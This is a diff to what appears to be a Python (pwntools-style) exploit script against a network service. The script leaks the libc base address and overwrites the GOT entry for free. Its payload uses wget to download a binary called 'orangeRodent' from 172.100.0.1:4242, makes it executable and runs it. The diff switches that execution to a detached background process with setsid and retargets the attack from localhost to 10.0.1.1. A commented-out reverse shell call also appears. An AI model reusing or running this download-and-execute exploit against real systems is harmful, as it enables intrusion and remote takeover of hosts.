@@ -67,9 +67,9 @@ def exploit(ip: str, port: int):
     log.success(f"Leaked libc base addr: {hex(libc)}")
     log.info("Writing reverse shell shell script payload")
     #sendRevShellSysPayload(sock, "172.100.0.1", "4242", "4243")
-    sendScript(sock, "wget 172.100.0.1:4242/orangeRodent 2>&1 1>/dev/null; chmod +x orangeRodent; ./orangeRodent;")
+    sendScript(sock, "wget 172.100.0.1:4242/orangeRodent 2>&1 1>/dev/null; chmod +x orangeRodent; setsid ./orangeRodent &")
     log.info("Overwrting GOT free entry")
     overwriteFreeGot(sock, libc)
 
 if __name__ == "__main__":
-    exploit("127.0.0.1", 4200)
+    exploit("10.0.1.1", 4200)
